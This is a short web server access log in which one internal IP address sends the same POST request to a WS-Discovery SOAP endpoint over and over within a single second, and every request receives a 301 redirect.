172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
